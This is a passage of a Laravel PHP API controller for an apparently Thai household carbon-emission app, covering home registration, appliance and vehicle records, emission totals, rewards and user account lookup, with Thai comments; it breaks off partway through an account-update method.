<?php

namespace App\Http\Controllers\API;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Http\JsonResponse;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Storage;
use App\Models\ItemType;
use App\Models\Tree;
use Illuminate\Support\Facades\Log;
use Carbon\Carbon;
use DatePeriod;
use DateInterval;
use Carbon\CarbonPeriod;

use Illuminate\Validation\Rule;


class AppController extends Controller
{


    public function createHome(Request $request): JsonResponse
    {
        // 1) Validate incoming payload
        $data = $request->validate([
            'Home_number' => 'required|string|max:255',
            'User_Code' => 'required|integer|exists:user,User_Code',
            'Village_Code' => 'required|integer',
            'img' => 'nullable|image|max:5120',
        ]);

        // ป้องกันช่องว่าง/เคสแตกต่าง
        $homeNumber = trim($data['Home_number']);
        $villageCode = (int) $data['Village_Code'];

        // 1.1) ตรวจเลขบ้านซ้ำในหมู่บ้านเดียวกัน (case-insensitive)
        $dupExists = DB::table('home')
            ->where('Village_Code', $villageCode)
            ->whereRaw('LOWER(Home_number) = LOWER(?)', [$homeNumber])
            ->exists();

        if ($dupExists) {
            return response()->json([
                'status' => 409,
                'message' => 'บ้านเลขที่นี้มีอยู่แล้วในหมู่บ้านนี้',
                'errors' => [
                    'Home_number' => ['Duplicate home number in this village.']
                ],
            ], 409);
        }

        // 2) Compute new home_Code
        $maxCode = DB::table('home')->max('home_Code') ?? 0;
        $newCode = $maxCode + 1;

        // 3) จัดการไฟล์รูป (ถ้ามี)
        if ($request->hasFile('img')) {
            $file = $request->file('img');
            $ext = $file->getClientOriginalExtension();   // นามสกุล
            $fileName = $newCode . '.' . $ext;            // เช่น "5.png"
            $file->storeAs('Homes', $fileName, 'public'); // เก็บใน storage/app/public/Homes
            $data['img'] = $fileName;                     // เก็บชื่อไฟล์ลง DB
        } else {
            $data['img'] = null;
        }

        // 4) Insert into `home`
        try {
            $homeId = DB::table('home')->insertGetId([
                'home_Code' => $newCode,
                'Home_number' => $homeNumber,
                'Member_number' => 1,
                'Village_Code' => $villageCode,
                'img' => $data['img'],
            ]);
        } catch (\Exception $e) {
            return response()->json([
                'status' => 500,
                'message' => 'Insert home failed: ' . $e->getMessage(),
            ], 500);
        }

        // 5) Update `user` record: set home_Code = $newCode
        try {
            DB::table('user')
                ->where('User_Code', (int) $data['User_Code'])
                ->update([
                    'home_Code' => $newCode,
                ]);
        } catch (\Exception $e) {
            return response()->json([
                'status' => 500,
                'message' => 'Home created but failed to update user: ' . $e->getMessage(),
                'home_id' => $homeId,
                'home_Code' => $newCode,
            ], 500);
        }

        // 6) Return success
        return response()->json([
            'status' => 200,
            'message' => 'Home created and user updated successfully',
            'home_id' => $homeId,
            'home_Code' => $newCode,
        ], 200);
    }

    public function findHome(Request $request): JsonResponse
    {
        // 1) Validate incoming payload
        $validator = Validator::make($request->all(), [
            'Home_number' => 'required|string|max:255',
            'Village_Code' => 'required|integer|exists:village,Village_Code',
        ]);

        if ($validator->fails()) {
            return response()->json([
                'status' => 422,
                'message' => 'Validation error',
                'errors' => $validator->errors(),
            ], 422);
        }

        $homeNumber = $request->input('Home_number');
        $villageCode = $request->input('Village_Code');

        // 2) ค้นหา home พร้อมคอลัมน์ img
        $home = DB::table('home')
            ->where('Home_number', $homeNumber)
            ->where('Village_Code', $villageCode)
            ->first([
                'home_Code',
                'Home_number',
                'Village_Code',
                'img',            // ดึงชื่อไฟล์เก่าด้วย
            ]);

        if (!$home) {
            return response()->json([
                'status' => 404,
                'message' => 'ไม่พบบ้านเลขที่นี้ในหมู่บ้านของคุณ'
            ], 404);
        }

        // 3) ถ้ามีไฟล์ใหม่ Upload เข้ามา (field ชื่อ img ตาม validate)
        $newFilename = null;
        if ($request->hasFile('img')) {
            $file = $request->file('img');
            $ext = $file->getClientOriginalExtension();
            $newFilename = "{$home->home_Code}_" . time() . ".{$ext}";
            $file->storeAs('homes', $newFilename, 'public');
        }

        // 4) สร้าง URL ให้กับภาพ: ถ้ามีภาพใหม่ ให้ใช้ภาพใหม่ ถ้าไม่มีก็ใช้ภาพเดิม
        $filenameToUse = $newFilename ?? $home->img;
        $home->img = $filenameToUse
            ? url("storage/app/public/Homes/{$filenameToUse}")
            : null;

        // 5) คืนข้อมูลกลับไป
        return response()->json([
            'home_Code' => $home->home_Code,
            'Home_number' => $home->Home_number,
            'img' => $home->img,
        ], 200);
    }



    public function joinHome(Request $request): JsonResponse
    {
        // 1) Validate incoming payload
        $validator = Validator::make($request->all(), [
            'home_Code' => 'required|integer|exists:home,home_Code',
            'Home_number' => 'required|string|max:255',
            'User_Code' => 'required|integer|exists:user,User_Code',
            'Village_Code' => 'required|integer|exists:village,Village_Code',
        ]);

        if ($validator->fails()) {
            return response()->json([
                'status' => 422,
                'message' => 'Validation error',
                'errors' => $validator->errors(),
            ], 422);
        }
        $data = $validator->validated();

        // 2) ตรวจว่าข้อมูล home_Code, Home_number, Village_Code ตรงกันกับฐานข้อมูลหรือไม่
        $home = DB::table('home')
            ->where('home_Code', $data['home_Code'])
            ->where('Home_number', $data['Home_number'])
            ->where('Village_Code', $data['Village_Code'])
            ->first(['home_Code', 'Member_number']);

        if (!$home) {
            return response()->json([
                'status' => 404,
                'message' => 'ไม่พบบ้านเลขที่นี้ในหมู่บ้านของคุณ'
            ], 404);
        }

        // 3) เพิ่ม Member_number ของบ้านนั้นอีก 1
        $newMemberNumber = ($home->Member_number ?? 0) + 1;
        try {
            DB::table('home')
                ->where('home_Code', $data['home_Code'])
                ->update(['Member_number' => $newMemberNumber]);
        } catch (\Exception $e) {
            return response()->json([
                'status' => 500,
                'message' => 'Failed to increment member count: ' . $e->getMessage(),
            ], 500);
        }

        // 4) อัปเดต user: ตั้ง home_Code ของ user ที่ขอเข้าร่วม
        try {
            DB::table('user')
                ->where('User_Code', $data['User_Code'])
                ->update(['home_Code' => $data['home_Code']]);
        } catch (\Exception $e) {
            return response()->json([
                'status' => 500,
                'message' => 'Member incremented but failed to update user: ' . $e->getMessage(),
            ], 500);
        }

        // 5) ตอบกลับสำเร็จ
        return response()->json([
            'status' => 200,
            'message' => 'เข้าร่วมครัวเรือนสำเร็จ',
            'home_Code' => $data['home_Code'],
            'Member_number' => $newMemberNumber,
        ], 200);
    }

    public function mainHome(Request $request): JsonResponse
    {
        // 1) Validate
        $validator = Validator::make($request->all(), [
            'User_Code' => 'required|integer|exists:user,User_Code',
        ]);

        if ($validator->fails()) {
            return response()->json([
                'status' => 422,
                'message' => 'Validation error',
                'errors' => $validator->errors(),
            ], 422);
        }

        $userCode = $request->input('User_Code');

        // 2) JOIN user กับ home และ SELECT field ที่ต้องการ
        $home = DB::table('user')
            ->join('home', 'user.Home_Code', '=', 'home.Home_Code')
            ->where('user.User_Code', $userCode)
            ->select([
                'home.Home_number',
                'home.img',    // ชื่อไฟล์ใน DB
            ])
            ->first();

        if (!$home) {
            return response()->json([
                'status' => 404,
                'message' => 'ไม่พบข้อมูลบ้านสำหรับผู้ใช้คนนี้'
            ], 404);
        }

        // 3) ต่อ URL ให้กับ img (ถ้ามี)
        if (!empty($home->img)) {
            // ต้องรัน php artisan storage:link แล้ว
            $home->img = asset("storage/app/public/homes/{$home->img}");
        }

        // 4) คืน JSON
        return response()->json([
            'status' => 200,
            'Home_number' => $home->Home_number,
            'img' => $home->img,
        ], 200);
    }
    public function getRewardByHome(Request $request, $homeCode): JsonResponse
    {
        // 2) JOIN user กับ home และ SELECT field ที่ต้องการ
        $rewards = DB::table('rewarded')
            ->join('home', 'rewarded.home_Code', '=', 'home.home_Code')
            ->join('reward', 'rewarded.Reward_Code', '=', 'reward.Reward_Code')
            ->where('rewarded.home_Code', $homeCode)
            ->select([
                'reward.Reward_Name as title',
                'reward.img',
                'rewarded.Have_Date',
            ])
            ->get();  // ✅ ดึงหลายแถว


        if (!$rewards) {
            return response()->json([
                'status' => 404,
                'message' => 'ไม่พบข้อมูลบ้านสำหรับผู้ใช้คนนี้'
            ], 404);
        }

        // 3) ต่อ URL ให้กับ img (ถ้ามี)
        $rewards->transform(function ($reward) {
            if (!empty($reward->img)) {
                $reward->img = asset("storage/app/public/rewards/{$reward->img}");
            }
            return $reward;
        });


        // 4) คืน JSON
        return response()->json([
            'status' => 200,
            'rewards' => $rewards,
        ], 200);

    }

    public function getGasByHome(Request $request, $userCode): JsonResponse
    {
        // ดึง home_Code จาก user
        $user = DB::table('user')
            ->where('User_Code', $userCode)
            ->select('home_Code')
            ->first();

        if (!$user || !$user->home_Code) {
            return response()->json([
                'status' => 404,
                'message' => 'ไม่พบข้อมูลบ้านของผู้ใช้คนนี้'
            ], 404);
        }

        // คำนวณผลรวมของการปล่อยก๊าซจาก usings ที่ตรงกับ home_Code เดียวกัน
        $gasSum = DB::table('usings')
            ->join('user', 'usings.User_Code', '=', 'user.User_Code')
            ->where('user.home_Code', $user->home_Code)
            ->where('usings.input_type', 'd')
            ->selectRaw('
            SUM(usings.CO2_emission) as CO2_emission,
            SUM(usings.CH4_emission) as CH4_emission,
            SUM(usings.N2O_emission) as N2O_emission
        ')
            ->first();

        return response()->json([
            'status' => 200,
            'CO2_emission' => (float) $gasSum->CO2_emission,
            'CH4_emission' => (float) $gasSum->CH4_emission,
            'N2O_emission' => (float) $gasSum->N2O_emission,
        ], 200);
    }

    public function allGasByHome(Request $request, $userCode): JsonResponse
    {
        // ดึง home_Code จาก user
        $user = DB::table('user')
            ->where('User_Code', $userCode)
            ->select('home_Code')
            ->first();

        if (!$user || !$user->home_Code) {
            return response()->json([
                'status' => 404,
                'message' => 'ไม่พบข้อมูลบ้านของผู้ใช้คนนี้'
            ], 404);
        }

        // คำนวณผลรวมของการปล่อยก๊าซจาก usings ที่ตรงกับ home_Code เดียวกัน
        $gasSum = DB::table('usings')
            ->join('user', 'usings.User_Code', '=', 'user.User_Code')
            ->where('user.home_Code', $user->home_Code)
            ->where('usings.input_type', 'd')
            ->selectRaw('
            SUM(usings.CO2_emission) as CO2_emission,
            SUM(usings.CH4_emission) as CH4_emission,
            SUM(usings.N2O_emission) as N2O_emission,
            SUM(CO2_emission + CH4_emission + N2O_emission) as total
        ')
            ->first();

        return response()->json([
            'status' => 200,
            'total' => (float) $gasSum->total,
        ], 200);
    }




    public function getItemType(): JsonResponse
    {
        // ดึงข้อมูลทั้งหมด
        $items = DB::table('item_type')
            ->join('unit', 'item_type.Unit_Code', '=', 'unit.Unit_Code')
            ->select([
                'item_type.Item_type_Code',
                'item_type.Item_type_Name',
                'item_type.img',
                'item_type.Many_Type',
                'unit.Unit_Name',
            ])
            ->get();

        // 2) map ให้ img กลายเป็น URL เต็ม (ถ้ามี)
        $items = $items->map(function ($item) {
            if (!empty($item->img)) {
                // ต้องรัน php artisan storage:link แล้ว
                $item->img = url("storage/app/public/itemTypes/{$item->img}");
            }
            return $item;
        });

        // 3) สถานะ 204 ถ้าไม่มีข้อมูล, 200 ถ้ามี
        $statusCode = $items->isEmpty() ? 204 : 200;

        // 4) คืน JSON
        return response()->json($items, $statusCode);
    }
    public function getFuel(): JsonResponse
    {
        // ดึงข้อมูลทั้งหมด
        $items = DB::table('fuel')
            ->select([
                'fuel.fuel_Code',
                'fuel.fuel_Name',
                'fuel.img',
            ])
            ->where('type', 'V')
            ->get();

        // 2) map ให้ img กลายเป็น URL เต็ม (ถ้ามี)
        $items = $items->map(function ($item) {
            if (!empty($item->img)) {
                // ต้องรัน php artisan storage:link แล้ว
                $item->img = url("storage/app/public/itemTypes/{$item->img}");
            }
            return $item;
        });

        // 3) สถานะ 204 ถ้าไม่มีข้อมูล, 200 ถ้ามี
        $statusCode = $items->isEmpty() ? 204 : 200;

        // 4) คืน JSON
        return response()->json($items, $statusCode);
    }
    public function getFuelFood(): JsonResponse
    {
        // ดึงข้อมูลทั้งหมด
        $items = DB::table('fuel')
            ->select([
                'fuel.fuel_Code',
                'fuel.fuel_Name',
                'fuel.img',
            ])
            ->where('type', 'F')
            ->get();

        // 2) map ให้ img กลายเป็น URL เต็ม (ถ้ามี)
        $items = $items->map(function ($item) {
            if (!empty($item->img)) {
                // ต้องรัน php artisan storage:link แล้ว
                $item->img = url("storage/app/public/itemTypes/{$item->img}");
            }
            return $item;
        });

        // 3) สถานะ 204 ถ้าไม่มีข้อมูล, 200 ถ้ามี
        $statusCode = $items->isEmpty() ? 204 : 200;

        // 4) คืน JSON
        return response()->json($items, $statusCode);
    }
    public function addItem(Request $request): JsonResponse
    {
        // 1) Validate incoming payload
        $validator = Validator::make($request->all(), [
            'Item_type_Code' => 'required|integer|exists:item_type,Item_type_Code',
            // 'watt' => 'nullable|numeric|min:0',
            'size' => 'nullable|numeric|min:0',
            'location' => 'required|string|max:150',
            'type' => 'required|string|max:50',
            'home_Code' => 'required|integer|exists:home,Home_Code',
        ]);

        if ($validator->fails()) {
            return response()->json([
                'status' => 422,
                'message' => 'Validation error',
                'errors' => $validator->errors(),
            ], 422);
        }

        $data = $validator->validated();

        // 2) Compute new Item_Code (ถ้าตารางไม่ใช้ auto-increment)
        $maxCode = DB::table('item')->max('Item_Code') ?? 0;
        $newCode = $maxCode + 1;

        // 3) Insert record
        try {
            DB::table('item')->insert([
                'Item_Code' => $newCode,
                'Item_type_Code' => $data['Item_type_Code'],
                'size' => $data['size'],
                // 'watt' => $data['watt'],
                'location_name' => $data['location'],
                'type' => $data['type'],
                'Home_Code' => $data['home_Code'],
                'Use_status' => 0,
                'Input_date' => now(),
                'is_delete' => 0,
            ]);
        } catch (\Exception $e) {
            return response()->json([
                'status' => 500,
                'message' => 'Insert failed: ' . $e->getMessage(),
            ], 500);
        }

        // 4) Return success
        return response()->json([
            'status' => 200,
            'message' => 'Insert successful',
            'Item_Code' => $newCode,
        ], 200);
    }

    public function updateItem(Request $request): JsonResponse
    {
        // ใช้ exists กับคอลัมน์จริงในตาราง
        $validator = Validator::make($request->all(), [
            'item_Code' => 'required|integer|exists:item,item_Code', // <- แก้ตรงนี้
            'Item_type_Code' => 'sometimes|integer|exists:item_type,Item_type_Code',
            'size' => 'sometimes|nullable|numeric|min:0',
            'location' => 'sometimes|string|max:150',
            'type' => 'sometimes|string|max:50',
            'home_Code' => 'sometimes|integer|exists:home,Home_Code',
            'Use_status' => 'sometimes|integer|in:0,1',
        ]);

        if ($validator->fails()) {
            return response()->json([
                'status' => 422,
                'message' => 'Validation error',
                'errors' => $validator->errors(),
            ], 422);
        }

        $data = $validator->validated();

        // สร้าง payload
        $update = [];

        if (array_key_exists('Item_type_Code', $data)) {
            $update['Item_type_Code'] = $data['Item_type_Code'];
        }
        if (array_key_exists('size', $data)) {
            $update['size'] = $data['size']; // อนุญาต null
        }
        if (array_key_exists('location', $data)) {
            $update['location_name'] = $data['location'];
        }
        if (array_key_exists('type', $data)) {
            $update['type'] = $data['type'];
        }
        if (array_key_exists('home_Code', $data)) {
            $update['Home_Code'] = $data['home_Code'];
        }
        if (array_key_exists('Use_status', $data)) {
            $update['Use_status'] = $data['Use_status'];
        }

        if (empty($update)) {
            return response()->json([
                'status' => 422,
                'message' => 'No fields to update',
            ], 422);
        }

        try {
            // ใช้คอลัมน์จริงใน where ด้วย
            $affected = DB::table('item')
                ->where('item_Code', $data['item_Code']) // <- แก้ตรงนี้
                ->update($update);

            // ล็อกเพื่อดีบั๊กให้ละเอียดขึ้น
            \Log::info('updateItem', [
                'req' => $request->all(),
                'update' => $update,
                'affected' => $affected,
            ]);

        } catch (\Throwable $e) {
            \Log::error('updateItem error', [
                'msg' => $e->getMessage(),
                'file' => $e->getFile(),
                'line' => $e->getLine(),
                'trace' => $e->getTraceAsString(),
                'req' => $request->all(),
            ]);
            return response()->json([
                'status' => 500,
                'message' => 'Update failed: ' . $e->getMessage(),
            ], 500);
        }

        // ถ้ามีแถวจริงแต่ค่าเหมือนเดิม affected=0 -> ถือว่า success ก็ได้ เพื่อลดความสับสน
        if ($affected === 0) {
            // ตรวจว่ามีอยู่จริงไหม
            $exists = DB::table('item')->where('Item_Code', $data['item_Code'])->exists();
            if ($exists) {
                return response()->json([
                    'status' => 200,
                    'message' => 'No changes (same values)',
                    'Item_Code' => (int) $data['item_Code'],
                ], 200);
            }
            return response()->json([
                'status' => 404,
                'message' => 'Not found',
            ], 404);
        }

        return response()->json([
            'status' => 200,
            'message' => 'Update successful',
            'Item_Code' => (int) $data['item_Code'], // <- ใช้ key ที่มีจริง
        ], 200);
    }
    public function deleteHomeItem(Request $request): JsonResponse
    {
        // ใช้ exists กับคอลัมน์จริงในตาราง
        $v = Validator::make($request->all(), [
            'item_Code' => 'required|integer',
        ]);
        if ($v->fails()) {
            return response()->json([
                'status' => false,
                'message' => 'ข้อมูลไม่ถูกต้อง',
                'errors' => $v->errors(),
            ], 422);
        }



        $updated = DB::table('item')
            ->where('item_Code', $request->item_Code)
            ->update(['is_delete' => 1]);

        // ถือว่าสำเร็จแม้ affected=0 ถ้า row มีอยู่จริง (กันเคสตั้งค่าเดิม)
        $exists = DB::table('item')->where('item_Code', $request->item_Code)->exists();

        return ($updated || $exists)
            ? response()->json(['status' => true, 'message' => 'ข้อมูลถูกลบแล้วเรียบร้อยแล้ว'])
            : response()->json(['status' => false, 'message' => 'ลบข้อมูลไม่ได้']);
    }



    public function addVehicle(Request $request): JsonResponse
    {
        // 1) Validate incoming payload
        $validator = Validator::make($request->all(), [
            'fuel_Code' => 'required|integer|exists:fuel,fuel_Code',
            // 'watt' => 'nullable|numeric|min:0',
            'km_per_litre' => 'required|string',
            'vehicle_type' => 'required|string|max:50',
            'plate_no' => 'required|string|max:50',
            'home_Code' => 'required|integer|exists:home,Home_Code',
        ]);

        if ($validator->fails()) {
            return response()->json([
                'status' => 422,
                'message' => 'Validation error',
                'errors' => $validator->errors(),
            ], 422);
        }

        $data = $validator->validated();

        // 2) Compute new Item_Code (ถ้าตารางไม่ใช้ auto-increment)
        $maxCode = DB::table('item')->max('Item_Code') ?? 0;
        $newCode = $maxCode + 1;
        $kmPerLitre = (float) str_replace(',', '.', $data['km_per_litre']);
        // 3) Insert record
        try {
            DB::table('item')->insert([
                'Item_Code' => $newCode,
                'fuel_Code' => $data['fuel_Code'],
                // 'watt' => $data['watt'],
                'size' => $kmPerLitre,
                'type' => $data['vehicle_type'],
                'location_name' => $data['plate_no'],
                'Home_Code' => $data['home_Code'],
                'Use_status' => 0,
                'Input_date' => now(),
                'is_delete' => 0,
            ]);
        } catch (\Exception $e) {
            return response()->json([
                'status' => 500,
                'message' => 'Insert failed: ' . $e->getMessage(),
            ], 500);
        }

        // 4) Return success
        return response()->json([
            'status' => 200,
            'message' => 'Insert successful',
            'Item_Code' => $newCode,
        ], 200);
    }

    public function updateVehicle(Request $request): JsonResponse
    {
        // ใช้ exists กับคอลัมน์จริงในตาราง
        $validator = Validator::make($request->all(), [
            'item_Code' => 'required|integer|exists:item,item_Code', // <- แก้ตรงนี้
            'fuel_Code' => 'required|integer|exists:fuel,fuel_Code',
            // 'watt' => 'nullable|numeric|min:0',
            'km_per_litre' => 'required|string',
            'vehicle_type' => 'required|string|max:50',
            'plate_no' => 'required|string|max:50',
            'home_Code' => 'required|integer|exists:home,Home_Code',
        ]);

        if ($validator->fails()) {
            return response()->json([
                'status' => 422,
                'message' => 'Validation error',
                'errors' => $validator->errors(),
            ], 422);
        }

        $data = $validator->validated();

        // สร้าง payload
        $update = [];

        if (array_key_exists('fuel_Code', $data)) {
            $update['fuel_Code'] = $data['fuel_Code'];
        }
        if (array_key_exists('km_per_litre', $data)) {
            $update['size'] = $data['km_per_litre']; // อนุญาต null
        }
        if (array_key_exists('plate_no', $data)) {
            $update['location_name'] = $data['plate_no'];
        }
        if (array_key_exists('vehicle_type', $data)) {
            $update['type'] = $data['vehicle_type'];
        }
        if (array_key_exists('home_Code', $data)) {
            $update['Home_Code'] = $data['home_Code'];
        }

        if (empty($update)) {
            return response()->json([
                'status' => 422,
                'message' => 'No fields to update',
            ], 422);
        }

        try {
            // ใช้คอลัมน์จริงใน where ด้วย
            $affected = DB::table('item')
                ->where('item_Code', $data['item_Code']) // <- แก้ตรงนี้
                ->update($update);

            // ล็อกเพื่อดีบั๊กให้ละเอียดขึ้น
            \Log::info('updateVehicle', [
                'req' => $request->all(),
                'update' => $update,
                'affected' => $affected,
            ]);

        } catch (\Throwable $e) {
            \Log::error('updateItem error', [
                'msg' => $e->getMessage(),
                'file' => $e->getFile(),
                'line' => $e->getLine(),
                'trace' => $e->getTraceAsString(),
                'req' => $request->all(),
            ]);
            return response()->json([
                'status' => 500,
                'message' => 'Update failed: ' . $e->getMessage(),
            ], 500);
        }

        // ถ้ามีแถวจริงแต่ค่าเหมือนเดิม affected=0 -> ถือว่า success ก็ได้ เพื่อลดความสับสน
        if ($affected === 0) {
            // ตรวจว่ามีอยู่จริงไหม
            $exists = DB::table('item')->where('Item_Code', $data['item_Code'])->exists();
            if ($exists) {
                return response()->json([
                    'status' => 200,
                    'message' => 'No changes (same values)',
                    'Item_Code' => (int) $data['item_Code'],
                ], 200);
            }
            return response()->json([
                'status' => 404,
                'message' => 'Not found',
            ], 404);
        }

        return response()->json([
            'status' => 200,
            'message' => 'Update successful',
            'Item_Code' => (int) $data['item_Code'], // <- ใช้ key ที่มีจริง
        ], 200);
    }


    public function addFoodFuel(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'home_Code' => 'required|integer|exists:home,home_Code',
            'fuel_Code' => 'required|integer|exists:fuel,fuel_Code',
            'km_per_litre' => 'required|string',
        ]);

        if ($validator->fails()) {
            return response()->json([
                'status' => 422,
                'message' => 'ข้อมูลไม่ถูกต้อง',
                'errors' => $validator->errors(),
            ], 422);
        }

        $data = $validator->validated();

        $maxCode = DB::table('item')->max('Item_Code') ?? 0;
        $newCode = $maxCode + 1;

        try {
            DB::table('item')->insert([
                'Item_Code' => $newCode,
                'fuel_Code' => $data['fuel_Code'],
                // 'watt' => $data['watt'],
                'location_name' => 'home',
                'Home_Code' => $data['home_Code'],
                'size' => $data['km_per_litre'],
                'Use_status' => 0,
                'Input_date' => now(),
            ]);
        } catch (\Exception $e) {
            return response()->json([
                'status' => 500,
                'message' => 'Insert failed: ' . $e->getMessage(),
            ], 500);
        }

        return response()->json([
            'status' => 200,
            'message' => 'Insert successful',
            'Item_Code' => $newCode,
        ], 200);
    }

    public function updateFoodFuel(Request $request): JsonResponse
    {
        // ใช้ exists กับคอลัมน์จริงในตาราง
        $validator = Validator::make($request->all(), [
            'item_Code' => 'required|integer|exists:item,item_Code', // <- แก้ตรงนี้
            'fuel_Code' => 'required|integer|exists:fuel,fuel_Code',
            // 'watt' => 'nullable|numeric|min:0',
            'km_per_litre' => 'required|string',
            'home_Code' => 'required|integer|exists:home,Home_Code',
        ]);

        if ($validator->fails()) {
            return response()->json([
                'status' => 422,
                'message' => 'Validation error',
                'errors' => $validator->errors(),
            ], 422);
        }

        $data = $validator->validated();

        // สร้าง payload
        $update = [];

        if (array_key_exists('fuel_Code', $data)) {
            $update['fuel_Code'] = $data['fuel_Code'];
        }
        if (array_key_exists('km_per_litre', $data)) {
            $update['size'] = $data['km_per_litre']; // อนุญาต null
        }
        if (array_key_exists('home_Code', $data)) {
            $update['Home_Code'] = $data['home_Code'];
        }

        if (empty($update)) {
            return response()->json([
                'status' => 422,
                'message' => 'No fields to update',
            ], 422);
        }

        try {
            // ใช้คอลัมน์จริงใน where ด้วย
            $affected = DB::table('item')
                ->where('item_Code', $data['item_Code']) // <- แก้ตรงนี้
                ->update($update);

            // ล็อกเพื่อดีบั๊กให้ละเอียดขึ้น
            \Log::info('updateVehicle', [
                'req' => $request->all(),
                'update' => $update,
                'affected' => $affected,
            ]);

        } catch (\Throwable $e) {
            \Log::error('updateItem error', [
                'msg' => $e->getMessage(),
                'file' => $e->getFile(),
                'line' => $e->getLine(),
                'trace' => $e->getTraceAsString(),
                'req' => $request->all(),
            ]);
            return response()->json([
                'status' => 500,
                'message' => 'Update failed: ' . $e->getMessage(),
            ], 500);
        }

        // ถ้ามีแถวจริงแต่ค่าเหมือนเดิม affected=0 -> ถือว่า success ก็ได้ เพื่อลดความสับสน
        if ($affected === 0) {
            // ตรวจว่ามีอยู่จริงไหม
            $exists = DB::table('item')->where('Item_Code', $data['item_Code'])->exists();
            if ($exists) {
                return response()->json([
                    'status' => 200,
                    'message' => 'No changes (same values)',
                    'Item_Code' => (int) $data['item_Code'],
                ], 200);
            }
            return response()->json([
                'status' => 404,
                'message' => 'Not found',
            ], 404);
        }

        return response()->json([
            'status' => 200,
            'message' => 'Update successful',
            'Item_Code' => (int) $data['item_Code'], // <- ใช้ key ที่มีจริง
        ], 200);
    }
    public function getHomeItem($homeCode): JsonResponse
    {
        // ดึงข้อมูลทั้งหมด
        $items = DB::table('item')
            ->join('item_type', 'item.Item_type_Code', '=', 'item_type.Item_type_Code')
            ->join('unit', 'item_type.Unit_Code', '=', 'unit.Unit_Code')
            ->where('item.home_Code', $homeCode)
            ->where('item.is_delete', 0)
            ->whereNotNull('item.Item_type_Code')
            ->select([
                'item.item_Code',
                'item.size',
                'item.Use_status',
                'item.location_name',
                'item.type',
                'item_type.Item_type_Code',
                'item_type.Item_type_Name',
                'item_type.img',
                'item_type.Many_Type',
                'unit.Unit_Name',
            ])
            ->get();

        // 2) map ให้ img กลายเป็น URL เต็ม (ถ้ามี)
        $items = $items->map(function ($item) {
            if (!empty($item->img)) {
                // ต้องรัน php artisan storage:link แล้ว
                $item->img = url("storage/app/public/itemTypes/{$item->img}");
            }
            return $item;
        });

        // 3) สถานะ 204 ถ้าไม่มีข้อมูล, 200 ถ้ามี
        $statusCode = $items->isEmpty() ? 204 : 200;

        // 4) คืน JSON
        return response()->json($items, $statusCode);
    }

    public function updateItemStatus(Request $request): \Illuminate\Http\JsonResponse
    {
        $v = Validator::make($request->all(), [
            'item_Code' => 'required|integer',
            'Use_status' => 'required_without:status|integer', // รับได้อันใดอันหนึ่ง
            'status' => 'required_without:Use_status|integer|in:0,1',
            'startStatus' => 'nullable|integer|in:0,1',
        ]);
        if ($v->fails()) {
            return response()->json([
                'status' => false,
                'message' => 'ข้อมูลไม่ถูกต้อง',
                'errors' => $v->errors(),
            ], 422);
        }

        // ถ้ามี status ให้ใช้เลย (ค่าที่ต้องการตั้ง)
        if ($request->filled('status')) {
            $next = (int) $request->input('status');
        } else {
            // ถ้าไม่มี status ให้ flip จาก startStatus (ถ้ามี) มิฉะนั้นใช้ Use_status ที่ส่งมาเป็น “ค่าที่จะตั้ง”
            if ($request->filled('startStatus')) {
                $next = ((int) $request->input('startStatus') === 1) ? 0 : 1;
            } else {
                $next = (int) $request->input('Use_status'); // ตีความว่าเป็นค่าที่จะตั้ง
            }
        }

        $updated = DB::table('item')
            ->where('item_Code', $request->item_Code)
            ->update(['Use_status' => $next]);

        // ถือว่าสำเร็จแม้ affected=0 ถ้า row มีอยู่จริง (กันเคสตั้งค่าเดิม)
        $exists = DB::table('item')->where('item_Code', $request->item_Code)->exists();

        return ($updated || $exists)
            ? response()->json(['status' => true, 'message' => 'อัปเดตสถานะเรียบร้อยแล้ว', 'next' => $next])
            : response()->json(['status' => false, 'message' => 'ไม่พบรายการหรืออัปเดตไม่ได้'], 404);
    }


    public function getAccount($userCode): JsonResponse
    {
        // 1) ดึง user record ก่อนเพื่อตรวจสอบ User_Type
        $userBase = DB::table('user')
            ->where('User_Code', $userCode)
            ->select(['User_Name', 'email', 'tel', 'status', 'User_Type', 'img', 'Village_Code', 'Home_Code'])
            ->first();

        if (!$userBase) {
            return response()->json([], 204);
        }

        // 2) ถ้า User_Type == 2 (เช่นเป็นหัวหน้าหมู่บ้าน) ไม่ต้อง join ตาราง home
        if ($userBase->User_Type == 2) {
            // ดึงชื่อหมู่บ้านจาก Village_Code
            $villageName = DB::table('village')
                ->where('Village_Code', $userBase->Village_Code)
                ->value('Village_Name');

            return response()->json([
                'User_Name' => $userBase->User_Name,
                'email' => $userBase->email,
                'User_Type' => $userBase->User_Type,
                'tel' => $userBase->tel,
                'status' => $userBase->status,
                'user_img' => $userBase->img ? url("storage/app/public/users/{$userBase->img}") : null,
                'Village_Name' => $villageName,
                'Home_number' => null,
                'home_img' => null,
            ], 200);
        }

        // 3) ถ้าไม่ใช่ User_Type 2 ให้ join home ด้วย
        $user = DB::table('user')
            ->join('village', 'user.Village_Code', '=', 'village.Village_Code')
            ->join('home', 'user.Home_Code', '=', 'home.Home_Code')
            ->where('user.User_Code', $userCode)
            ->select([
                'user.User_Name',
                'user.email',
                'user.tel',
                'user.status',
                'user.User_Type',
                'user.img       as user_img',
                'village.Village_Name',
                'home.Home_number',
                'home.img       as home_img',
            ])
            ->first();

        if (!$user) {
            return response()->json([], 204);
        }

        if (!empty($user->user_img)) {
            $user->user_img = url("storage/app/public/users/{$user->user_img}");
        }

        if (!empty($user->home_img)) {
            $user->home_img = url("storage/app/public/homes/{$user->home_img}");
        }

        return response()->json($user, 200);
    }


    public function updateAccount(Request $request, $userCode): JsonResponse
    {
        // 1) Validate incoming payload
        $validator = Validator::make($request->all(), [
            'User_Name' => 'required|string|max:255',
            // unique เทียบกับตาราง user, ยกเว้นเรคอร์ดตัวเอง
            'email' => 'required|email|unique:user,email,' . $userCode . ',User_Code',
            'tel' => 'required|string|max:20|unique:user,tel,' . $userCode . ',User_Code',
        ]);

        if ($validator->fails()) {
            return response()->json([
                'status' => 422,
                'message' => 'Validation error',
                'errors' => $validator->errors(),
            ], 422);
        }

        // 2) ตรวจว่าผู้ใช้มีอยู่จริงหรือไม่
        $exists = DB::table('user')->where('User_Code', $userCode)->exists();
        if (!$exists) {
            return response()->json([
                'status' => 404,
                'message' => 'User not found',
            ], 404);
        }

        // 3) อัปเดตข้อมูล
        try {
